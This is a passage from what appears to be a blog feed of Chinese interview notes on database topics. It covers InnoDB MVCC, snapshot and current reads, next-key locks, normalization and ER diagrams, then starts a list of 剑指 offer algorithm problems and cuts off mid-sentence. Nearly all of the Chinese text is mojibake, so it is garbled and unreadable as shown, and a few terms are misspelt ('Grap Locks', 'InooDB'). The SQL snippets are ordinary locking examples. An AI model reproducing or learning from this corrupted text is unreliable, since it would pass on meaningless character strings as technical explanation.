äº”ã€å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ˆMulti-Version Concurrency Control, MVCCï¼‰æ˜¯ MySQL çš„ InnoDB å­˜å‚¨å¼•æ“å®ç°éš”ç¦»çº§åˆ«çš„ä¸€ç§å…·ä½“æ–¹å¼ï¼Œç”¨äºå®ç°æäº¤è¯»å’Œå¯é‡å¤è¯»è¿™ä¸¤ç§éš”ç¦»çº§åˆ«ã€‚è€Œæœªæäº¤è¯»éš”ç¦»çº§åˆ«æ€»æ˜¯è¯»å–æœ€æ–°çš„æ•°æ®è¡Œï¼Œæ— éœ€ä½¿ç”¨ MVCCï¼›å¯ä¸²è¡ŒåŒ–éš”ç¦»çº§åˆ«éœ€è¦å¯¹æ‰€æœ‰è¯»å–çš„è¡Œéƒ½åŠ é”ï¼Œå•çº¯ä½¿ç”¨ MVCC æ— æ³•å®ç°ã€‚ ç‰ˆæœ¬å· ç³»ç»Ÿç‰ˆæœ¬å·ï¼šæ˜¯ä¸€ä¸ªé€’å¢çš„æ•°å­—ï¼Œæ¯å¼€å§‹ä¸€ä¸ªæ–°çš„äº‹åŠ¡ï¼Œç³»ç»Ÿç‰ˆæœ¬å·å°±ä¼šè‡ªåŠ¨é€’å¢ã€‚ äº‹åŠ¡ç‰ˆæœ¬å·ï¼šäº‹åŠ¡å¼€å§‹æ—¶çš„ç³»ç»Ÿç‰ˆæœ¬å·ã€‚ InooDB çš„ MVCC åœ¨æ¯è¡Œè®°å½•åé¢éƒ½ä¿å­˜ç€ä¸¤ä¸ªéšè—çš„åˆ—ï¼Œç”¨æ¥å­˜å‚¨ä¸¤ä¸ªç‰ˆæœ¬å·ï¼š åˆ›å»ºç‰ˆæœ¬å·ï¼šæŒ‡ç¤ºåˆ›å»ºä¸€ä¸ªæ•°æ®è¡Œçš„å¿«ç…§æ—¶çš„ç³»ç»Ÿç‰ˆæœ¬å·ï¼› åˆ é™¤ç‰ˆæœ¬å·ï¼šå¦‚æœè¯¥å¿«ç…§çš„åˆ é™¤ç‰ˆæœ¬å·å¤§äºå½“å‰äº‹åŠ¡ç‰ˆæœ¬å·è¡¨ç¤ºè¯¥å¿«ç…§æœ‰æ•ˆï¼Œå¦åˆ™è¡¨ç¤ºè¯¥å¿«ç…§å·²ç»è¢«åˆ é™¤äº†ã€‚ Undo æ—¥å¿—InnoDB çš„ MVCC ä½¿ç”¨åˆ°çš„å¿«ç…§å­˜å‚¨åœ¨ Undo æ—¥å¿—ä¸­ï¼Œè¯¥æ—¥å¿—é€šè¿‡å›æ»šæŒ‡é’ˆæŠŠä¸€ä¸ªæ•°æ®è¡Œï¼ˆRecordï¼‰çš„æ‰€æœ‰å¿«ç…§è¿æ¥èµ·æ¥ã€‚ å®ç°è¿‡ç¨‹ä»¥ä¸‹å®ç°è¿‡ç¨‹é’ˆå¯¹å¯é‡å¤è¯»éš”ç¦»çº§åˆ«ã€‚ 1. SELECTå½“å¼€å§‹æ–°ä¸€ä¸ªäº‹åŠ¡æ—¶ï¼Œè¯¥äº‹åŠ¡çš„ç‰ˆæœ¬å·è‚¯å®šä¼šå¤§äºå½“å‰æ‰€æœ‰æ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·ï¼Œç†è§£è¿™ä¸€ç‚¹å¾ˆå…³é”®ã€‚ å¤šä¸ªäº‹åŠ¡å¿…é¡»è¯»å–åˆ°åŒä¸€ä¸ªæ•°æ®è¡Œçš„å¿«ç…§ï¼Œå¹¶ä¸”è¿™ä¸ªå¿«ç…§æ˜¯è·ç¦»ç°åœ¨æœ€è¿‘çš„ä¸€ä¸ªæœ‰æ•ˆå¿«ç…§ã€‚ä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–ï¼Œå¦‚æœæœ‰ä¸€ä¸ªäº‹åŠ¡æ­£åœ¨ä¿®æ”¹è¯¥æ•°æ®è¡Œï¼Œé‚£ä¹ˆå®ƒå¯ä»¥è¯»å–äº‹åŠ¡æœ¬èº«æ‰€åšçš„ä¿®æ”¹ï¼Œè€Œä¸ç”¨å’Œå…¶å®ƒäº‹åŠ¡çš„è¯»å–ç»“æœä¸€è‡´ã€‚ æŠŠæ²¡æœ‰å¯¹ä¸€ä¸ªæ•°æ®è¡Œåšä¿®æ”¹çš„äº‹åŠ¡ç§°ä¸º Tï¼ŒT æ‰€è¦è¯»å–çš„æ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·å¿…é¡»å°äº T çš„ç‰ˆæœ¬å·ï¼Œå› ä¸ºå¦‚æœå¤§äºæˆ–è€…ç­‰äº T çš„ç‰ˆæœ¬å·ï¼Œé‚£ä¹ˆè¡¨ç¤ºè¯¥æ•°æ®è¡Œå¿«ç…§æ˜¯å…¶å®ƒäº‹åŠ¡çš„æœ€æ–°ä¿®æ”¹ï¼Œå› æ­¤ä¸èƒ½å»è¯»å–å®ƒã€‚ é™¤äº†ä¸Šé¢çš„è¦æ±‚ï¼ŒT æ‰€è¦è¯»å–çš„æ•°æ®è¡Œå¿«ç…§çš„åˆ é™¤ç‰ˆæœ¬å·å¿…é¡»å¤§äº T çš„ç‰ˆæœ¬å·ï¼Œå› ä¸ºå¦‚æœå°äºç­‰äº T çš„ç‰ˆæœ¬å·ï¼Œé‚£ä¹ˆè¡¨ç¤ºè¯¥æ•°æ®è¡Œå¿«ç…§æ˜¯å·²ç»è¢«åˆ é™¤çš„ï¼Œä¸åº”è¯¥å»è¯»å–å®ƒã€‚ 2. INSERTå°†å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºæ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·ã€‚ 3. DELETEå°†å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºæ•°æ®è¡Œå¿«ç…§çš„åˆ é™¤ç‰ˆæœ¬å·ã€‚ 4. UPDATEå°†å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºæ›´æ–°åçš„æ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·ï¼ŒåŒæ—¶å°†å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºæ›´æ–°å‰çš„æ•°æ®è¡Œå¿«ç…§çš„åˆ é™¤ç‰ˆæœ¬å·ã€‚å¯ä»¥ç†è§£ä¸ºå…ˆæ‰§è¡Œ DELETE åæ‰§è¡Œ INSERTã€‚ å¿«ç…§è¯»ä¸å½“å‰è¯»1. å¿«ç…§è¯»ä½¿ç”¨ MVCC è¯»å–çš„æ˜¯å¿«ç…§ä¸­çš„æ•°æ®ï¼Œè¿™æ ·å¯ä»¥å‡å°‘åŠ é”æ‰€å¸¦æ¥çš„å¼€é”€ã€‚ 1select * from table ...; 2. å½“å‰è¯»è¯»å–çš„æ˜¯æœ€æ–°çš„æ•°æ®ï¼Œéœ€è¦åŠ é”ã€‚ä»¥ä¸‹ç¬¬ä¸€ä¸ªè¯­å¥éœ€è¦åŠ  S é”ï¼Œå…¶å®ƒéƒ½éœ€è¦åŠ  X é”ã€‚ 12345select * from table where ? lock in share mode;select * from table where ? for update;insert;update;delete; å…­ã€Next-Key LocksNext-Key Locks ä¹Ÿæ˜¯ MySQL çš„ InnoDB å­˜å‚¨å¼•æ“çš„ä¸€ç§é”å®ç°ã€‚MVCC ä¸èƒ½è§£å†³å¹»è¯»çš„é—®é¢˜ï¼ŒNext-Key Locks å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜è€Œå­˜åœ¨çš„ã€‚åœ¨å¯é‡å¤è¯»ï¼ˆREPEATABLE READï¼‰éš”ç¦»çº§åˆ«ä¸‹ï¼Œä½¿ç”¨ MVCC + Next-Key Locks å¯ä»¥è§£å†³å¹»è¯»é—®é¢˜ã€‚ Record Locksé”å®šæ•´ä¸ªè®°å½•ï¼ˆè¡Œï¼‰ã€‚é”å®šçš„å¯¹è±¡æ˜¯è®°å½•çš„ç´¢å¼•ï¼Œè€Œä¸æ˜¯è®°å½•æœ¬èº«ã€‚å¦‚æœè¡¨æ²¡æœ‰è®¾ç½®ç´¢å¼•ï¼ŒInnoDB ä¼šè‡ªåŠ¨åœ¨ä¸»é”®ä¸Šåˆ›å»ºéšè—çš„èšé›†ç´¢å¼•ï¼Œå› æ­¤ Record Locks ä¾ç„¶å¯ä»¥ä½¿ç”¨ã€‚ Grap Locksé”å®šä¸€ä¸ªèŒƒå›´å†…çš„ç´¢å¼•ï¼Œä¾‹å¦‚å½“ä¸€ä¸ªäº‹åŠ¡æ‰§è¡Œä»¥ä¸‹è¯­å¥ï¼Œå…¶å®ƒäº‹åŠ¡å°±ä¸èƒ½åœ¨ t.c ä¸­æ’å…¥ 15ã€‚ 1SELECT c FROM t WHERE c BETWEEN 10 and 20 FOR UPDATE; Next-Key Lockså®ƒæ˜¯ Record Locks å’Œ Gap Locks çš„ç»“åˆï¼Œä¸ä»…é”å®šä¸€ä¸ªè®°å½•ï¼Œä¹Ÿé”å®šèŒƒå›´å†…çš„ç´¢å¼•ã€‚åœ¨ user ä¸­æœ‰ä»¥ä¸‹è®°å½•ï¼š 12345678| id | last_name | first_name | age ||------|-------------|--------------|-------|| 4 | stark | tony | 21 || 1 | tom | hiddleston | 30 || 3 | morgan | freeman | 40 || 5 | jeff | dean | 50 || 2 | donald | trump | 80 |+------|-------------|--------------|-------+ é‚£ä¹ˆå°±éœ€è¦é”å®šä»¥ä¸‹èŒƒå›´ï¼š 123456(-âˆ, 21](21, 30](30, 40](40, 50](50, 80](80, âˆ) ä¸ƒã€å…³ç³»æ•°æ®åº“è®¾è®¡ç†è®ºå‡½æ•°ä¾èµ–è®° A-&gt;B è¡¨ç¤º A å‡½æ•°å†³å®š Bï¼Œä¹Ÿå¯ä»¥è¯´ B å‡½æ•°ä¾èµ–äº Aã€‚ å¦‚æœ {A1ï¼ŒA2ï¼Œâ€¦ ï¼ŒAn} æ˜¯å…³ç³»çš„ä¸€ä¸ªæˆ–å¤šä¸ªå±æ€§çš„é›†åˆï¼Œè¯¥é›†åˆå‡½æ•°å†³å®šäº†å…³ç³»çš„å…¶å®ƒæ‰€æœ‰å±æ€§å¹¶ä¸”æ˜¯æœ€å°çš„ï¼Œé‚£ä¹ˆè¯¥é›†åˆå°±ç§°ä¸ºé”®ç ã€‚ å¯¹äº A-&gt;Bï¼Œå¦‚æœèƒ½æ‰¾åˆ° A çš„çœŸå­é›† Aâ€™ï¼Œä½¿å¾— Aâ€™-&gt; Bï¼Œé‚£ä¹ˆ A-&gt;B å°±æ˜¯éƒ¨åˆ†å‡½æ•°ä¾èµ–ï¼Œå¦åˆ™å°±æ˜¯å®Œå…¨å‡½æ•°ä¾èµ–ï¼› å¯¹äº A-&gt;Bï¼ŒB-&gt;Cï¼Œåˆ™ A-&gt;C æ˜¯ä¸€ä¸ªä¼ é€’å‡½æ•°ä¾èµ–ã€‚ å¼‚å¸¸ä»¥ä¸‹çš„å­¦ç”Ÿè¯¾ç¨‹å…³ç³»çš„å‡½æ•°ä¾èµ–ä¸º Sno, Cname -&gt; Sname, Sdept, Mname, Gradeï¼Œé”®ç ä¸º {Sno, Cname}ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç¡®å®šå­¦ç”Ÿå’Œè¯¾ç¨‹ä¹‹åï¼Œå°±èƒ½ç¡®å®šå…¶å®ƒä¿¡æ¯ã€‚ Sno Sname Sdept Mname Cname Grade 1 å­¦ç”Ÿ-1 å­¦é™¢-1 é™¢é•¿-1 è¯¾ç¨‹-1 90 2 å­¦ç”Ÿ-2 å­¦é™¢-2 é™¢é•¿-2 è¯¾ç¨‹-2 80 2 å­¦ç”Ÿ-2 å­¦é™¢-2 é™¢é•¿-2 è¯¾ç¨‹-1 100 3 å­¦ç”Ÿ-3 å­¦é™¢-2 é™¢é•¿-2 è¯¾ç¨‹-2 95 ä¸ç¬¦åˆèŒƒå¼çš„å…³ç³»ï¼Œä¼šäº§ç”Ÿå¾ˆå¤šå¼‚å¸¸ï¼Œä¸»è¦æœ‰ä»¥ä¸‹å››ç§å¼‚å¸¸ï¼š å†—ä½™æ•°æ®ï¼šä¾‹å¦‚ å­¦ç”Ÿ-2 å‡ºç°äº†ä¸¤æ¬¡ã€‚ ä¿®æ”¹å¼‚å¸¸ï¼šä¿®æ”¹äº†ä¸€ä¸ªè®°å½•ä¸­çš„ä¿¡æ¯ï¼Œä½†æ˜¯å¦ä¸€ä¸ªè®°å½•ä¸­ç›¸åŒçš„ä¿¡æ¯å´æ²¡æœ‰è¢«ä¿®æ”¹ã€‚ åˆ é™¤å¼‚å¸¸ï¼šåˆ é™¤ä¸€ä¸ªä¿¡æ¯ï¼Œé‚£ä¹ˆä¹Ÿä¼šä¸¢å¤±å…¶å®ƒä¿¡æ¯ã€‚ä¾‹å¦‚å¦‚æœåˆ é™¤äº† è¯¾ç¨‹-1ï¼Œéœ€è¦åˆ é™¤ç¬¬ä¸€è¡Œå’Œç¬¬ä¸‰è¡Œï¼Œé‚£ä¹ˆ å­¦ç”Ÿ-1 çš„ä¿¡æ¯å°±ä¼šä¸¢å¤±ã€‚ æ’å…¥å¼‚å¸¸ï¼Œä¾‹å¦‚æƒ³è¦æ’å…¥ä¸€ä¸ªå­¦ç”Ÿçš„ä¿¡æ¯ï¼Œå¦‚æœè¿™ä¸ªå­¦ç”Ÿè¿˜æ²¡é€‰è¯¾ï¼Œé‚£ä¹ˆå°±æ— æ³•æ’å…¥ã€‚ èŒƒå¼èŒƒå¼ç†è®ºæ˜¯ä¸ºäº†è§£å†³ä»¥ä¸Šæåˆ°å››ç§å¼‚å¸¸ã€‚ é«˜çº§åˆ«èŒƒå¼çš„ä¾èµ–äºä½çº§åˆ«çš„èŒƒå¼ï¼Œ1NF æ˜¯æœ€ä½çº§åˆ«çš„èŒƒå¼ã€‚ 1. ç¬¬ä¸€èŒƒå¼ (1NF)å±æ€§ä¸å¯åˆ†ï¼› 2. ç¬¬äºŒèŒƒå¼ (2NF)æ¯ä¸ªéä¸»å±æ€§å®Œå…¨å‡½æ•°ä¾èµ–äºé”®ç ã€‚ å¯ä»¥é€šè¿‡åˆ†è§£æ¥æ»¡è¶³ã€‚ åˆ†è§£å‰ Sno Sname Sdept Mname Cname Grade 1 å­¦ç”Ÿ-1 å­¦é™¢-1 é™¢é•¿-1 è¯¾ç¨‹-1 90 2 å­¦ç”Ÿ-2 å­¦é™¢-2 é™¢é•¿-2 è¯¾ç¨‹-2 80 2 å­¦ç”Ÿ-2 å­¦é™¢-2 é™¢é•¿-2 è¯¾ç¨‹-1 100 3 å­¦ç”Ÿ-3 å­¦é™¢-2 é™¢é•¿-2 è¯¾ç¨‹-2 95 ä»¥ä¸Šå­¦ç”Ÿè¯¾ç¨‹å…³ç³»ä¸­ï¼Œ{Sno, Cname} ä¸ºé”®ç ï¼Œæœ‰å¦‚ä¸‹å‡½æ•°ä¾èµ–ï¼š Sno -&gt; Sname, Sdept Sdept -&gt; Mname Sno, Cname-&gt; Grade Grade å®Œå…¨å‡½æ•°ä¾èµ–äºé”®ç ï¼Œå®ƒæ²¡æœ‰ä»»ä½•å†—ä½™æ•°æ®ï¼Œæ¯ä¸ªå­¦ç”Ÿçš„æ¯é—¨è¯¾éƒ½æœ‰ç‰¹å®šçš„æˆç»©ã€‚ Sname, Sdept å’Œ Mname éƒ½éƒ¨åˆ†ä¾èµ–äºé”®ç ï¼Œå½“ä¸€ä¸ªå­¦ç”Ÿé€‰ä¿®äº†å¤šé—¨è¯¾æ—¶ï¼Œè¿™äº›æ•°æ®å°±ä¼šå‡ºç°å¤šæ¬¡ï¼Œé€ æˆå¤§é‡å†—ä½™æ•°æ®ã€‚ åˆ†è§£å å…³ç³»-1 Sno Sname Sdept Mname 1 å­¦ç”Ÿ-1 å­¦é™¢-1 é™¢é•¿-1 2 å­¦ç”Ÿ-2 å­¦é™¢-2 é™¢é•¿-2 3 å­¦ç”Ÿ-3 å­¦é™¢-2 é™¢é•¿-2 æœ‰ä»¥ä¸‹å‡½æ•°ä¾èµ–ï¼š Sno -&gt; Sname, Sdept, Mname Sdept -&gt; Mname å…³ç³»-2 Sno Cname Grade 1 è¯¾ç¨‹-1 90 2 è¯¾ç¨‹-2 80 2 è¯¾ç¨‹-1 100 3 è¯¾ç¨‹-2 95 æœ‰ä»¥ä¸‹å‡½æ•°ä¾èµ–ï¼š Sno, Cname -&gt; Grade 3. ç¬¬ä¸‰èŒƒå¼ (3NF)éä¸»å±æ€§ä¸ä¼ é€’å‡½æ•°ä¾èµ–äºé”®ç ã€‚ ä¸Šé¢çš„ å…³ç³»-1 ä¸­å­˜åœ¨ä»¥ä¸‹ä¼ é€’å‡½æ•°ä¾èµ–ï¼šSno -&gt; Sdept -&gt; Mnameï¼Œå¯ä»¥è¿›è¡Œä»¥ä¸‹åˆ†è§£ï¼š å…³ç³»-11 Sno Sname Sdept 1 å­¦ç”Ÿ-1 å­¦é™¢-1 2 å­¦ç”Ÿ-2 å­¦é™¢-2 3 å­¦ç”Ÿ-3 å­¦é™¢-2 å…³ç³»-12 Sdept Mname å­¦é™¢-1 é™¢é•¿-1 å­¦é™¢-2 é™¢é•¿-2 å…«ã€ER å›¾Entity-Relationshipï¼Œæœ‰ä¸‰ä¸ªç»„æˆéƒ¨åˆ†ï¼šå®ä½“ã€å±æ€§ã€è”ç³»ã€‚ ç”¨æ¥è¿›è¡Œå…³ç³»å‹æ•°æ®åº“ç³»ç»Ÿçš„æ¦‚å¿µè®¾è®¡ã€‚ å®ä½“çš„ä¸‰ç§è”ç³»åŒ…å«ä¸€å¯¹ä¸€ï¼Œä¸€å¯¹å¤šï¼Œå¤šå¯¹å¤šä¸‰ç§ã€‚ å¦‚æœ A åˆ° B æ˜¯ä¸€å¯¹å¤šå…³ç³»ï¼Œé‚£ä¹ˆç”»ä¸ªå¸¦ç®­å¤´çš„çº¿æ®µæŒ‡å‘ Bï¼›å¦‚æœæ˜¯ä¸€å¯¹ä¸€ï¼Œç”»ä¸¤ä¸ªå¸¦ç®­å¤´çš„çº¿æ®µï¼›å¦‚æœæ˜¯å¤šå¯¹å¤šï¼Œç”»ä¸¤ä¸ªä¸å¸¦ç®­å¤´çš„çº¿æ®µã€‚ä¸‹å›¾çš„ Course å’Œ Student æ˜¯ä¸€å¯¹å¤šçš„å…³ç³»ã€‚ è¡¨ç¤ºå‡ºç°å¤šæ¬¡çš„å…³ç³»ä¸€ä¸ªå®ä½“åœ¨è”ç³»å‡ºç°å‡ æ¬¡ï¼Œå°±è¦ç”¨å‡ æ¡çº¿è¿æ¥ã€‚ä¸‹å›¾è¡¨ç¤ºä¸€ä¸ªè¯¾ç¨‹çš„å…ˆä¿®å…³ç³»ï¼Œå…ˆä¿®å…³ç³»å‡ºç°ä¸¤ä¸ª Course å®ä½“ï¼Œç¬¬ä¸€ä¸ªæ˜¯å…ˆä¿®è¯¾ç¨‹ï¼Œåä¸€ä¸ªæ˜¯åä¿®è¯¾ç¨‹ï¼Œå› æ­¤éœ€è¦ç”¨ä¸¤æ¡çº¿æ¥è¡¨ç¤ºè¿™ç§å…³ç³»ã€‚ è”ç³»çš„å¤šå‘æ€§è™½ç„¶è€å¸ˆå¯ä»¥å¼€è®¾å¤šé—¨è¯¾ï¼Œå¹¶ä¸”å¯ä»¥æ•™æˆå¤šåå­¦ç”Ÿï¼Œä½†æ˜¯å¯¹äºç‰¹å®šçš„å­¦ç”Ÿå’Œè¯¾ç¨‹ï¼Œåªæœ‰ä¸€ä¸ªè€å¸ˆæ•™æˆï¼Œè¿™å°±æ„æˆäº†ä¸€ä¸ªä¸‰å…ƒè”ç³»ã€‚ ä¸€èˆ¬åªä½¿ç”¨äºŒå…ƒè”ç³»ï¼Œå¯ä»¥æŠŠå¤šå…ƒå…³ç³»è½¬æ¢ä¸ºäºŒå…ƒå…³ç³»ã€‚ è¡¨ç¤ºå­ç±»ç”¨ä¸€ä¸ªä¸‰è§’å½¢å’Œä¸¤æ¡çº¿æ¥è¿æ¥ç±»å’Œå­ç±»ï¼Œä¸å­ç±»æœ‰å…³çš„å±æ€§å’Œè”ç³»éƒ½è¿åˆ°å­ç±»ä¸Šï¼Œè€Œä¸çˆ¶ç±»å’Œå­ç±»éƒ½æœ‰å…³çš„è¿åˆ°çˆ¶ç±»ä¸Šã€‚ å‚è€ƒèµ„æ–™ AbrahamSilberschatz, HenryF.Korth, S.Sudarshan, ç­‰. æ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2006. æ–½ç“¦èŒ¨. é«˜æ€§èƒ½ MYSQL(ç¬¬3ç‰ˆ)[M]. ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾, 2013. å²å˜‰æƒ. æ•°æ®åº“ç³»ç»Ÿæ¦‚è®º[M]. æ¸…åå¤§å­¦å‡ºç‰ˆç¤¾æœ‰é™å…¬å¸, 2006. The InnoDB Storage Engine Transaction isolation levels Concurrency Control The Nightmare of Locking, Blocking and Isolation Levels! Database Normalization and Normal Forms with an Example The basics of the InnoDB undo logging and history system MySQL locking for the busy web developer æµ…å…¥æµ…å‡º MySQL å’Œ InnoDB Innodb ä¸­çš„äº‹åŠ¡éš”ç¦»çº§åˆ«å’Œé”çš„å…³ç³»]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰‘æŒ‡ offer é¢˜è§£]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E5%89%91%E6%8C%87%20offer%20%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[2. å®ç° Singleton 3. æ•°ç»„ä¸­é‡å¤çš„æ•°å­— 4. äºŒç»´æ•°ç»„ä¸­çš„æŸ¥æ‰¾ 5. æ›¿æ¢ç©ºæ ¼ 6. ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨ 7. é‡å»ºäºŒå‰æ ‘ 8. äºŒå‰æ ‘çš„ä¸‹ä¸€ä¸ªç»“ç‚¹ 9. ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ— 10.1 æ–æ³¢é‚£å¥‘æ•°åˆ— 10.2 è·³å°é˜¶ 10.3 å˜æ€è·³å°é˜¶ 10.4 çŸ©å½¢è¦†ç›– 11. æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­— 12. çŸ©é˜µä¸­çš„è·¯å¾„ 13. æœºå™¨äººçš„è¿åŠ¨èŒƒå›´ 14. å‰ªç»³å­ 15. äºŒè¿›åˆ¶ä¸­ 1 çš„ä¸ªæ•° 16. æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹ 17. æ‰“å°ä» 1 åˆ°æœ€å¤§çš„ n ä½æ•° 18.1 åœ¨ O(1) æ—¶é—´å†…åˆ é™¤é“¾è¡¨èŠ‚ç‚¹ 18.2 åˆ é™¤é“¾è¡¨ä¸­é‡å¤çš„ç»“ç‚¹ 19. æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… 20. è¡¨ç¤ºæ•°å€¼çš„å­—ç¬¦ä¸² 21. è°ƒæ•´æ•°ç»„é¡ºåºä½¿å¥‡æ•°ä½äºå¶æ•°å‰é¢ 22. é“¾è¡¨ä¸­å€’æ•°ç¬¬ K ä¸ªç»“ç‚¹ 23. é“¾è¡¨ä¸­ç¯çš„å…¥å£ç»“ç‚¹ 24. åè½¬é“¾è¡¨ 25. åˆå¹¶ä¸¤ä¸ªæ’åºçš„é“¾è¡¨ 26. æ ‘çš„å­ç»“æ„ 27. äºŒå‰æ ‘çš„é•œåƒ 28 å¯¹ç§°çš„äºŒå‰æ ‘ 29. é¡ºæ—¶é’ˆæ‰“å°çŸ©é˜µ 30. åŒ…å« min å‡½æ•°çš„æ ˆ 31. æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ— 32.1 ä»ä¸Šå¾€ä¸‹æ‰“å°äºŒå‰æ ‘ 32.2 æŠŠäºŒå‰æ ‘æ‰“å°æˆå¤šè¡Œ 32.3 æŒ‰ä¹‹å­—å½¢é¡ºåºæ‰“å°äºŒå‰æ ‘ 33. äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ— 34. äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„ 35. å¤æ‚é“¾è¡¨çš„å¤åˆ¶ 36. äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨ 37. åºåˆ—åŒ–äºŒå‰æ ‘ 38. å­—ç¬¦ä¸²çš„æ’åˆ— 39. æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°è¶…è¿‡ä¸€åŠçš„æ•°å­— 40. æœ€å°çš„ K ä¸ªæ•° 41.1 æ•°æ®æµä¸­çš„ä¸­ä½æ•° 41.2 å­—ç¬¦æµä¸­ç¬¬ä¸€ä¸ªä¸é‡å¤çš„å­—ç¬¦ 42. è¿ç»­å­æ•°ç»„çš„æœ€å¤§å’Œ 43. ä» 1 åˆ° n æ•´æ•°ä¸­ 1 å‡ºç°çš„æ¬¡æ•° 44. æ•°å­—åºåˆ—ä¸­çš„æŸä¸€ä½æ•°å­— 45. æŠŠæ•°ç»„æ’æˆæœ€å°çš„æ•° 46. æŠŠæ•°å­—ç¿»è¯‘æˆå­—ç¬¦ä¸² 47. ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼ 48. æœ€é•¿ä¸å«é‡å¤å­—ç¬¦çš„å­å­—ç¬¦ä¸² 49. ä¸‘æ•° 50. ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ä½ç½® 51. æ•°ç»„ä¸­çš„é€†åºå¯¹ 52. ä¸¤ä¸ªé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…¬å…±ç»“ç‚¹ 53 æ•°å­—åœ¨æ’åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•° 54. äºŒå‰æœç´¢æ ‘çš„ç¬¬ K ä¸ªç»“ç‚¹ 55.1 äºŒå‰æ ‘çš„æ·±åº¦ 55.2 å¹³è¡¡äºŒå‰æ ‘ 56. æ•°ç»„ä¸­åªå‡ºç°ä¸€æ¬¡çš„æ•°å­— 57.1 å’Œä¸º S çš„ä¸¤ä¸ªæ•°å­— 57.2 å’Œä¸º S çš„è¿ç»­æ­£æ•°åºåˆ— 58.1 ç¿»è½¬å•è¯é¡ºåºåˆ— 58.2 å·¦æ—‹è½¬å­—ç¬¦ä¸² 59. æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼ 60. n ä¸ªéª°å­çš„ç‚¹æ•° 61. æ‰‘å…‹ç‰Œé¡ºå­ 62. åœ†åœˆä¸­æœ€åå‰©ä¸‹çš„æ•° 63. è‚¡ç¥¨çš„æœ€å¤§åˆ©æ¶¦ 64. æ±‚ 1+2+3+â€¦+n 65. ä¸ç”¨åŠ å‡ä¹˜é™¤åšåŠ æ³• 66. æ„å»ºä¹˜ç§¯æ•°ç»„ 67. æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•° 68. æ ‘ä¸­ä¸¤ä¸ªèŠ‚ç‚¹çš„æœ€ä½å…¬å…±ç¥–å…ˆ å‚è€ƒæ–‡çŒ® 2. å®ç° Singletonå•ä¾‹æ¨¡å¼ 3. æ•°ç»„ä¸­é‡å¤çš„æ•°å­—NowCoder é¢˜ç›®æè¿°åœ¨ä¸€ä¸ªé•¿åº¦ä¸º n çš„æ•°ç»„é‡Œçš„æ‰€æœ‰æ•°å­—éƒ½åœ¨ 0 åˆ° n-1 çš„èŒƒå›´å†…ã€‚æ•°ç»„ä¸­æŸäº›æ•°å­—æ˜¯é‡å¤çš„ï¼Œä½†ä¸çŸ¥é“æœ‰å‡ ä¸ªæ•°å­—æ˜¯é‡å¤çš„ï¼Œä¹Ÿä¸çŸ¥é“æ¯ä¸ªæ•°å­—é‡å¤å‡ æ¬¡ã€‚è¯·æ‰¾å‡ºæ•°ç»„ä¸­ä»»æ„ä¸€ä¸ªé‡å¤çš„æ•°å­—ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¾“å…¥é•¿åº¦ä¸º 7 çš„æ•°ç»„ {2, 3, 1, 0, 2, 5}ï¼Œé‚£ä¹ˆå¯¹åº”çš„è¾“å‡ºæ˜¯ç¬¬ä¸€ä¸ªé‡å¤çš„æ•°å­— 2ã€‚ è¦æ±‚å¤æ‚åº¦ä¸º O(N) + O(1)ï¼Œä¹Ÿå°±æ˜¯æ—¶é—´å¤æ‚åº¦ O(N)ï¼Œç©ºé—´å¤æ‚åº¦ O(1)ã€‚å› æ­¤ä¸èƒ½ä½¿ç”¨æ’åºçš„æ–¹æ³•ï¼Œä¹Ÿä¸èƒ½ä½¿ç”¨é¢å¤–çš„æ ‡è®°æ•°ç»„ã€‚ç‰›å®¢ç½‘è®¨è®ºåŒºè¿™ä¸€é¢˜çš„é¦–ç¥¨ç­”æ¡ˆä½¿ç”¨ nums[i] + length æ¥å°†å…ƒç´ æ ‡è®°ï¼Œè¿™ä¹ˆåšä¼šæœ‰åŠ æ³•æº¢å‡ºé—®é¢˜ã€‚ è§£é¢˜æ€è·¯è¿™ç§æ•°ç»„å…ƒç´ åœ¨ [0, n-1] èŒƒå›´å†…çš„é—®é¢˜ï¼Œå¯ä»¥å°†å€¼ä¸º i çš„å…ƒç´ æ”¾åˆ°ç¬¬ i 